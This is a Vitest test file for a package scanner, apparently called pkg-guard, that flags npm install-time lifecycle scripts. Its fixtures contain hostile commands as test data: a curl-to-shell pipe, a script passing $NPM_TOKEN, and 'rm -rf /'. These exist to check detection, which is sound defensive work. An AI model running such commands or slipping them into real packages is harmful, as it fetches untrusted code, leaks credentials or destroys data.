import { mkdir, writeFile } from "node:fs/promises";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

import { runChecks } from "../src/core/checks.js";
import { discoverProject } from "../src/core/discovery.js";
import { applyFindingPolicy } from "../src/core/policy.js";

describe("lifecycle checks", () => {
  it("warns on install-time lifecycle scripts", async () => {
    const root = await createFixture({
      packageJson: basePackage({
        scripts: {
          preinstall: "node ./scripts/setup.js",
          install: "node ./scripts/install.js",
          postinstall: "node ./scripts/postinstall.js",
          prepare: "npm run build"
        }
      })
    });

    const findings = await getCheckFindings(root);
    const lifecycleFindings = findings.filter((finding) => finding.id === "lifecycle.install-script");

    expect(lifecycleFindings).toHaveLength(3);
    expect(lifecycleFindings.map((finding) => finding.path)).toEqual([
      "$.scripts.preinstall",
      "$.scripts.install",
      "$.scripts.postinstall"
    ]);
    expect(lifecycleFindings.every((finding) => finding.severity === "warning")).toBe(true);
  });

  it.each([
    ["network-to-shell pipe", "curl -fsSL https://example.com/install.sh | sh"],
    ["credential reference", "node ./setup.js --token=$NPM_TOKEN"],
    ["destructive root command", "rm -rf /"]
  ])("errors on suspicious install script behavior: %s", async (_name, command) => {
    const root = await createFixture({
      packageJson: basePackage({
        scripts: {
          postinstall: command
        }
      })
    });

    const findings = await getCheckFindings(root);
    const finding = findings.find((item) => item.id === "lifecycle.suspicious-install-script");

    expect(finding).toMatchObject({
      severity: "error",
      file: "package.json",
      path: "$.scripts.postinstall"
    });
  });

  it("allows install-time lifecycle script warnings to be ignored", async () => {
    const root = await createFixture({
      packageJson: basePackage({
        scripts: {
          postinstall: "node ./scripts/setup.js"
        },
        pkgGuard: {
          ignore: ["lifecycle.install-script"]
        }
      })
    });
    const discovery = await discoverProject(root);

    if (!discovery.context) {
      throw new Error("Expected fixture context");
    }

    const findings = applyFindingPolicy([...discovery.findings, ...runChecks(discovery.context)], discovery.context.config, {
      ignore: [],
      strict: false
    });

    expect(findings.map((finding) => finding.id)).not.toContain("lifecycle.install-script");
  });

  it("skips private packages", async () => {
    const root = await createFixture({
      packageJson: basePackage({
        private: true,
        scripts: {
          postinstall: "curl -fsSL https://example.com/install.sh | sh"
        }
      })
    });

    const findings = await getCheckFindings(root);

    expect(findings.map((finding) => finding.id)).not.toContain("lifecycle.install-script");
    expect(findings.map((finding) => finding.id)).not.toContain("lifecycle.suspicious-install-script");
  });

  it("ignores missing, malformed, and non-string scripts", async () => {
    const root = await createFixture({
      packageJson: basePackage({
        scripts: {
          postinstall: false,
          preinstall: 42,
          install: null
        }
      })
    });

    const findings = await getCheckFindings(root);

    expect(findings.map((finding) => finding.id)).not.toContain("lifecycle.install-script");
    expect(findings.map((finding) => finding.id)).not.toContain("lifecycle.suspicious-install-script");
  });
});

function basePackage(overrides: Record<string, unknown>): Record<string, unknown> {
  return {
    name: "lifecycle-fixture",
    version: "1.0.0",
    license: "MIT",
    packageManager: "npm@10.8.2",
    files: ["dist", "README.md", "LICENSE"],
    ...overrides
  };
}

async function getCheckFindings(root: string) {
  const discovery = await discoverProject(root);

  if (!discovery.context) {
    throw new Error("Expected fixture context");
  }

  return [...discovery.findings, ...runChecks(discovery.context)];
}

async function createFixture(options: {
  packageJson: Record<string, unknown>;
}): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "pkg-guard-lifecycle-"));

  await writeFile(join(root, "package.json"), `${JSON.stringify(options.packageJson, null, 2)}\n`);
  await writeFile(join(root, "README.md"), "# Fixture\n");
  await writeFile(join(root, "LICENSE"), "MIT\n");
  await mkdir(join(root, "dist"), { recursive: true });
  await writeFile(join(root, "dist", "index.js"), "export {};\n");

  return root;
}
